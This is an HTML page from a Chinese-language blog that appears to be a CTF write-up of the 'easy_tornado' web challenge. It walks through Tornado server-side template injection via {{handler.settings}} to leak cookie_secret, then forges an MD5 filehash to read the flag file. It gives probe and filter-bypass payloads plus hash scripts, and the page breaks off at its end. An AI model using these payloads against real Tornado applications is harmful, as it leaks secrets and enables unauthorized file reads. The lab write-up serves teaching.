@@ -1,0 +1,683 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>[CTF2] easy_tornado：SSTI、handler.settings 与 filehash 签名 | Quellisya's Blog</title><meta name="author" content="Quellisya"><meta name="copyright" content="Quellisya"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f3fbf8"><meta name="description" content="首页只给了三个 txt：flag 在 &#x2F;fllllllllllllag、提示 render、以及 md5(cookie_secret+md5(filename))。用 Tornado 的 handler.settings 泄露 cookie_secret，再按公式算出 filehash，就能读文件拿 flag。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[CTF2] easy_tornado：SSTI、handler.settings 与 filehash 签名">
+<meta property="og:url" content="https://quellisya.github.io/2026/11/01/web-ctf-easy-tornado/index.html">
+<meta property="og:site_name" content="Quellisya&#39;s Blog">
+<meta property="og:description" content="首页只给了三个 txt：flag 在 &#x2F;fllllllllllllag、提示 render、以及 md5(cookie_secret+md5(filename))。用 Tornado 的 handler.settings 泄露 cookie_secret，再按公式算出 filehash，就能读文件拿 flag。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://quellisya.github.io/img/avatar-seal.svg">
+<meta property="article:published_time" content="2026-11-01T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-11-01T02:00:00.000Z">
+<meta property="article:author" content="Quellisya">
+<meta property="article:tag" content="CTF2">
+<meta property="article:tag" content="MD5">
+<meta property="article:tag" content="SSTI">
+<meta property="article:tag" content="Tornado">
+<meta property="article:tag" content="cookie_secret">
+<meta property="article:tag" content="handler.settings">
+<meta property="article:tag" content="模板注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://quellisya.github.io/img/avatar-seal.svg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "[CTF2] easy_tornado：SSTI、handler.settings 与 filehash 签名",
+  "url": "https://quellisya.github.io/2026/11/01/web-ctf-easy-tornado/",
+  "image": "https://quellisya.github.io/img/avatar-seal.svg",
+  "datePublished": "2026-11-01T02:00:00.000Z",
+  "dateModified": "2026-11-01T02:00:00.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Quellisya",
+      "url": "https://github.com/Quellisya"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/logo-seal.svg"><link rel="canonical" href="https://quellisya.github.io/2026/11/01/web-ctf-easy-tornado/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        const data = { value }
+
+        if (ttl != null) {
+          data.expiry = Date.now() + ttl * 86400000
+        }
+
+        localStorage.setItem(key, JSON.stringify(data))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0f1f22')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#f3fbf8')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '[CTF2] easy_tornado：SSTI、handler.settings 与 filehash 签名',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/butterfly-custom.css"><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Quellisya's Blog" type="application/atom+xml">
+</head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/bg-ink-tech.svg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar-seal.svg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">63</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-layer-group"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://github.com/Quellisya"><i class="fa-fw fab fa-github"></i><span> GitHub</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/banner-ink-tech.svg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/logo-seal.svg" alt="Logo"><span class="site-name">Quellisya's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">[CTF2] easy_tornado：SSTI、handler.settings 与 filehash 签名</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-layer-group"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://github.com/Quellisya"><i class="fa-fw fab fa-github"></i><span> GitHub</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">[CTF2] easy_tornado：SSTI、handler.settings 与 filehash 签名</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-11-01T02:00:00.000Z" title="发表于 2026-11-01 10:00:00">2026-11-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-11-01T02:00:00.000Z" title="更新于 2026-11-01 10:00:00">2026-11-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/web/">Web</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/web/ssti/">SSTI</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div class="note primary flat"><p><strong>一分钟速览</strong></p>
+<ul>
+<li><strong>难度</strong>：入门</li>
+<li><strong>考点</strong>：SSTI（服务端模板注入）、Tornado 模板语法、<code>handler.settings</code> 信息泄露、MD5 签名</li>
+<li><strong>关键 payload</strong>：<code>/error?msg={{handler.settings}}</code></li>
+<li><strong>关键公式</strong>：<code>filehash = md5(cookie_secret + md5(filename))</code></li>
+<li><strong>flag</strong>：<code>CTF2{350f3f81-e4ac-451d-8565-8c664f833e94}</code></li>
+</ul>
+</div>
+
+<div class="note info flat"><p><strong>阅读说明</strong></p>
+<ul>
+<li><strong>前置知识</strong>：知道 HTTP GET 参数、Python 字符串、MD5 是什么；用过浏览器开发者工具更好</li>
+<li><strong>工具</strong>：浏览器、Python 3（或 <code>md5sum</code>）、CyberChef（可选）</li>
+<li><strong>环境</strong>：文中的靶场是临时环境，现在可能已失效；文末给了一个<strong>本地复现实验</strong>，可以照着搭</li>
+<li>本文所有测试仅用于<strong>授权靶场和本地环境</strong>，请勿对未授权站点进行测试。</li>
+</ul>
+</div>
+
+<div class="note default flat"><p><strong>做题路线</strong></p>
+<p><code>看首页三个 txt</code> → <code>拿到 flag 路径、render 提示、hash 公式</code> → <code>找会回显的参数</code> → <code>{{7*7}} 探测被拦</code> → <code>{{handler.settings}} 泄露 cookie_secret</code> → <code>算两次 MD5</code> → <code>构造 /file 请求</code> → <code>拿 flag</code></p>
+</div>
+
+<h2 id="第一步：把首页的三个文件都读一遍"><a href="#第一步：把首页的三个文件都读一遍" class="headerlink" title="第一步：把首页的三个文件都读一遍"></a>第一步：把首页的三个文件都读一遍</h2><p>打开靶场，首页只有三个链接：</p>
+<p><img src="/2026/11/01/web-ctf-easy-tornado/image.png" alt="首页的三个 txt"></p>
+<p><em>图 1：<code>/flag.txt</code>、<code>/welcome.txt</code>、<code>/hints.txt</code></em></p>
+<p>依次点开：</p>
+<p><code>/flag.txt</code>：</p>
+<p><img src="/2026/11/01/web-ctf-easy-tornado/image-1.png" alt="flag.txt"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag in /fllllllllllllag</span><br></pre></td></tr></table></figure>
+
+<p><code>/welcome.txt</code>：</p>
+<p><img src="/2026/11/01/web-ctf-easy-tornado/image-2.png" alt="welcome.txt"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render</span><br></pre></td></tr></table></figure>
+
+<p><code>/hints.txt</code>：</p>
+<p><img src="/2026/11/01/web-ctf-easy-tornado/image-3.png" alt="hints.txt"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure>
+
+<p>把三条信息拼起来，题目的结构就清楚了：</p>
+<table>
+<thead>
+<tr>
+<th>线索</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>flag in /fllllllllllllag</code></td>
+<td>flag 在服务器的一个文件里，路径是 <code>/fllllllllllllag</code></td>
+</tr>
+<tr>
+<td><code>render</code></td>
+<td>服务器用了<strong>模板渲染</strong>，联想到 SSTI（服务端模板注入）</td>
+</tr>
+<tr>
+<td><code>md5(cookie_secret+md5(filename))</code></td>
+<td>读取文件时需要 <code>filehash</code>，算法是两层 MD5，密钥是 <code>cookie_secret</code></td>
+</tr>
+</tbody></table>
+<p>也就是说，正常流程应该是「构造一个合法的 <code>filehash</code> 去读文件」。但我们不知道 <code>cookie_secret</code>——除非能从服务器那里<strong>泄露</strong>出来。</p>
+<p><code>render</code> 这个词就是入口。</p>
+<div class="note info flat"><p>题目名 <code>easy_tornado</code> 已经点名了框架：<strong>Tornado</strong>。Tornado 是 Python 的异步 Web 框架，自带模板引擎，模板语法用 <code>{{ ... }}</code> 包住 Python 表达式。看到 Tornado + render，第一反应就应该是 SSTI。</p>
+</div>
+
+<h2 id="第二步：什么是-SSTI"><a href="#第二步：什么是-SSTI" class="headerlink" title="第二步：什么是 SSTI"></a>第二步：什么是 SSTI</h2><p><strong>SSTI（Server-Side Template Injection，服务端模板注入）</strong> 是这么发生的：</p>
+<ol>
+<li>模板引擎把「模板」和「数据」分开处理；</li>
+<li>正常写法是 <code>render(&quot;hello.html&quot;, name=user_input)</code>，用户输入只是<strong>数据</strong>，不会被当成模板代码；</li>
+<li>如果开发者把用户输入<strong>拼进模板字符串</strong>再渲染，比如 <code>render_string(&quot;hello &quot; + user_input)</code>，用户输入就会被当成<strong>模板语法</strong>执行。</li>
+</ol>
+<p>一个最小例子：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 正常：用户输入是数据</span></span><br><span class="line">template = <span class="string">&quot;Hello &#123;&#123; name &#125;&#125;&quot;</span></span><br><span class="line">render(template, name=user_input)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 危险：用户输入进了模板本身</span></span><br><span class="line">render_string(<span class="string">&quot;Hello &quot;</span> + user_input)</span><br></pre></td></tr></table></figure>
+
+<p>当用户输入是 <code>&#123;&#123;7*7&#125;&#125;</code> 时，模板引擎会先计算 <code>7*7</code>，再把 <code>49</code> 输出到页面。<strong>这个「49 出现在页面上」就是 SSTI 存在的最直接证据。</strong></p>
+<p>不同模板引擎的语法不同：</p>
+<table>
+<thead>
+<tr>
+<th>引擎</th>
+<th>表达式语法</th>
+<th>典型探测 payload</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Tornado（Python）</td>
+<td><code>&#123;&#123; ... &#125;&#125;</code></td>
+<td><code>&#123;&#123;7*7&#125;&#125;</code> → <code>49</code></td>
+</tr>
+<tr>
+<td>Jinja2（Python&#x2F;Flask）</td>
+<td><code>&#123;&#123; ... &#125;&#125;</code></td>
+<td><code>&#123;&#123;7*7&#125;&#125;</code> → <code>49</code></td>
+</tr>
+<tr>
+<td>Django Template</td>
+<td><code>&#123;&#123; ... &#125;&#125;</code></td>
+<td><code>&#123;&#123;7*7&#125;&#125;</code> 通常不计算（Django 模板限制较多）</td>
+</tr>
+<tr>
+<td>Twig（PHP）</td>
+<td><code>&#123;&#123; ... &#125;&#125;</code></td>
+<td><code>&#123;&#123;7*7&#125;&#125;</code> → <code>49</code></td>
+</tr>
+<tr>
+<td>Smarty（PHP）</td>
+<td><code>&#123; ... &#125;</code></td>
+<td><code>&#123;7*7&#125;</code> → <code>49</code></td>
+</tr>
+<tr>
+<td>ERB（Ruby）</td>
+<td><code>&lt;%= ... %&gt;</code></td>
+<td><code>&lt;%= 7*7 %&gt;</code> → <code>49</code></td>
+</tr>
+<tr>
+<td>Freemarker（Java）</td>
+<td><code>$&#123; ... &#125;</code></td>
+<td><code>$&#123;7*7&#125;</code> → <code>49</code></td>
+</tr>
+</tbody></table>
+<p>本题是 Tornado，所以用 <code>&#123;&#123; &#125;&#125;</code>。</p>
+<h2 id="第三步：找注入点"><a href="#第三步：找注入点" class="headerlink" title="第三步：找注入点"></a>第三步：找注入点</h2><p>SSTI 需要两个条件同时满足：</p>
+<ol>
+<li>某个参数的值会被<strong>渲染</strong>；</li>
+<li>渲染结果会<strong>回显</strong>到页面。</li>
+</ol>
+<p>先看有哪些参数。首页的三个链接是静态文件，<code>/flag.txt</code> 只是文本。访问一个不存在的路径，看看错误页：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/error?msg=Error</span><br></pre></td></tr></table></figure>
+
+<p>页面回显：</p>
+<p><img src="/2026/11/01/web-ctf-easy-tornado/image-4.png" alt="&#x2F;error?msg&#x3D;Error"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error</span><br></pre></td></tr></table></figure>
+
+<p><code>msg</code> 参数的内容被原样显示在页面上。这很可能就是渲染点。试着让它算一道题：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/error?msg=&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<p><img src="/2026/11/01/web-ctf-easy-tornado/image-5.png" alt="7*7 被过滤"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ORZ</span><br></pre></td></tr></table></figure>
+
+<p>如果模板被正常执行，这里应该显示 <code>49</code>；但页面返回了 <code>ORZ</code>，说明 <code>&#123;&#123;7*7&#125;&#125;</code> 要么被 WAF 拦了，要么被关键词过滤了。<strong>不过这也说明 <code>msg</code> 确实是个特殊参数</strong>——普通参数不会触发这种拦截。</p>
+<div class="note warning flat"><p>不要因为一次 <code>{{7*7}}</code> 被拦就放弃。SSTI 的探测方式有很多：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7+7&#125;&#125;</span><br><span class="line">&#123;&#123;7**7&#125;&#125;</span><br><span class="line">&#123;&#123;7*&#x27;7&#x27;&#125;&#125;</span><br><span class="line">&#123;&#123; &quot;a&quot; ~ &quot;b&quot; &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果全被拦，可能是按特征匹配的 WAF；这时直接试目标框架的「信息泄露 payload」，比如 Tornado 的 <code>{{handler.settings}}</code>，有时反而不在拦截规则里。</p>
+</div>
+
+<h2 id="第四步：-handler-settings-泄露-cookie-secret"><a href="#第四步：-handler-settings-泄露-cookie-secret" class="headerlink" title="第四步： 泄露 cookie_secret"></a>第四步：<code>&#123;&#123;handler.settings&#125;&#125;</code> 泄露 <code>cookie_secret</code></h2><p>Tornado 在渲染模板时，会把当前请求的 <code>handler</code> 对象放进模板上下文。<code>handler</code> 是处理请求的 <code>RequestHandler</code> 实例，它有一个 <code>settings</code> 属性，里面是应用配置——包括 <code>cookie_secret</code>。</p>
+<p>直接请求：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>页面返回一个 Python 字典：</p>
+<p><img src="/2026/11/01/web-ctf-easy-tornado/image-6.png" alt="handler.settings 的输出"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;autoreload&#x27;: True, &#x27;compiled_template_cache&#x27;: False, &#x27;cookie_secret&#x27;: &#x27;11eaad43-3efb-4d73-a1a3-94282cdacebd&#x27;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拿到了：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie_secret = 11eaad43-3efb-4d73-a1a3-94282cdacebd</span><br></pre></td></tr></table></figure>
+
+<p>为什么这一条能成功，而 <code>&#123;&#123;7*7&#125;&#125;</code> 失败？因为 <code>&#123;&#123;handler.settings&#125;&#125;</code> 不带 <code>7*7</code> 这种明显的「计算特征」，很多黑名单只拦算术表达式和危险函数名，没拦属性访问。</p>
+<div class="note info flat"><p><strong><code>cookie_secret</code> 是什么？</strong></p>
+<p>在 Tornado 里，<code>cookie_secret</code> 是 <code>set_secure_cookie()</code> &#x2F; <code>get_secure_cookie()</code> 用来给 Cookie 做签名的密钥。名字虽然叫 cookie，但本题把它当作<strong>文件读取签名的密钥</strong>来用。</p>
+<p><code>RequestHandler.settings</code> 是应用的配置字典，除了 <code>cookie_secret</code>，还可能包含 <code>debug</code>、<code>autoreload</code>、数据库连接串等敏感信息。<strong>SSTI 能读出 <code>settings</code>，往往意味着整个应用的配置都泄露了。</strong></p>
+</div>
+
+<p>Tornado 里还有几种等价的泄露写法，遇到过滤时可以换着试：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;handler.settings&#125;&#125;</span><br><span class="line">&#123;&#123;handler.application.settings&#125;&#125;</span><br><span class="line">&#123;&#123;handler.settings[&#x27;cookie_secret&#x27;]&#125;&#125;</span><br><span class="line">&#123;&#123; handler.request &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="第五步：按公式算-filehash"><a href="#第五步：按公式算-filehash" class="headerlink" title="第五步：按公式算 filehash"></a>第五步：按公式算 <code>filehash</code></h2><p>线索里的公式是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filehash = md5(cookie_secret + md5(filename))</span><br></pre></td></tr></table></figure>
+
+<p>拆成两步：</p>
+<h3 id="5-1-第一层：md5-filename"><a href="#5-1-第一层：md5-filename" class="headerlink" title="5.1 第一层：md5(filename)"></a>5.1 第一层：<code>md5(filename)</code></h3><p>文件名要用题目给的完整路径：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/fllllllllllllag</span><br></pre></td></tr></table></figure>
+
+<p>注意开头的 <code>/</code> 和中间连续的 <code>l</code>，少一个都不行。计算：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(&quot;/fllllllllllllag&quot;) = 3bf9f6cf685a6dd8defadabfb41a03a1</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-第二层：md5-cookie-secret-第一层结果"><a href="#5-2-第二层：md5-cookie-secret-第一层结果" class="headerlink" title="5.2 第二层：md5(cookie_secret + 第一层结果)"></a>5.2 第二层：<code>md5(cookie_secret + 第一层结果)</code></h3><p>把 <code>cookie_secret</code> 和上面那串十六进制<strong>直接拼接</strong>（中间没有分隔符、没有换行）：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11eaad43-3efb-4d73-a1a3-94282cdacebd3bf9f6cf685a6dd8defadabfb41a03a1</span><br></pre></td></tr></table></figure>
+
+<p>再算一次 MD5：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">md5(&quot;11eaad43-3efb-4d73-a1a3-94282cdacebd3bf9f6cf685a6dd8defadabfb41a03a1&quot;)</span><br><span class="line">= c880229d196658ea79c55e9f93963632</span><br></pre></td></tr></table></figure>
+
+<p>所以：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filehash = c880229d196658ea79c55e9f93963632</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-3-用-Python-算"><a href="#5-3-用-Python-算" class="headerlink" title="5.3 用 Python 算"></a>5.3 用 Python 算</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">cookie_secret = <span class="string">&quot;11eaad43-3efb-4d73-a1a3-94282cdacebd&quot;</span></span><br><span class="line">filename = <span class="string">&quot;/fllllllllllllag&quot;</span></span><br><span class="line"></span><br><span class="line">inner = hashlib.md5(filename.encode()).hexdigest()</span><br><span class="line">filehash = hashlib.md5((cookie_secret + inner).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(inner)</span><br><span class="line"><span class="built_in">print</span>(filehash)</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3bf9f6cf685a6dd8defadabfb41a03a1</span><br><span class="line">c880229d196658ea79c55e9f93963632</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-4-用命令行算"><a href="#5-4-用命令行算" class="headerlink" title="5.4 用命令行算"></a>5.4 用命令行算</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;%s&#x27;</span> <span class="string">&quot;/fllllllllllllag&quot;</span> | <span class="built_in">md5sum</span></span><br><span class="line"><span class="comment"># 3bf9f6cf685a6dd8defadabfb41a03a1  -</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;%s&#x27;</span> <span class="string">&quot;11eaad43-3efb-4d73-a1a3-94282cdacebd3bf9f6cf685a6dd8defadabfb41a03a1&quot;</span> | <span class="built_in">md5sum</span></span><br><span class="line"><span class="comment"># c880229d196658ea79c55e9f93963632  -</span></span><br></pre></td></tr></table></figure>
+
+<div class="note warning flat"><p><strong>千万别用 <code>echo</code> 直接算。</strong></p>
+<p><code>echo &quot;abc&quot; | md5sum</code> 会把换行符 <code>\n</code> 也算进去，得到的哈希和程序里的不一样。用 <code>printf &#39;%s&#39;</code> 或者 Python 的 <code>hashlib</code>，确保输入没有多余的换行和空格。</p>
+<p>同理，字符串拼接顺序必须是「<code>cookie_secret</code> 在前，<code>md5(filename)</code> 在后」，反过来算出来的值完全不同。</p>
+</div>
+
+<h2 id="第六步：构造-file-请求，拿-flag"><a href="#第六步：构造-file-请求，拿-flag" class="headerlink" title="第六步：构造 /file 请求，拿 flag"></a>第六步：构造 <code>/file</code> 请求，拿 flag</h2><p>把文件名和 <code>filehash</code> 拼进 <code>/file</code> 接口：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=/fllllllllllllag&amp;filehash=c880229d196658ea79c55e9f93963632</span><br></pre></td></tr></table></figure>
+
+<p>访问后页面显示：</p>
+<p><img src="/2026/11/01/web-ctf-easy-tornado/image-7.png" alt="读取文件成功"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/fllllllllllllag</span><br><span class="line">CTF2&#123;350f3f81-e4ac-451d-8565-8c664f833e94&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拿到 flag：</p>
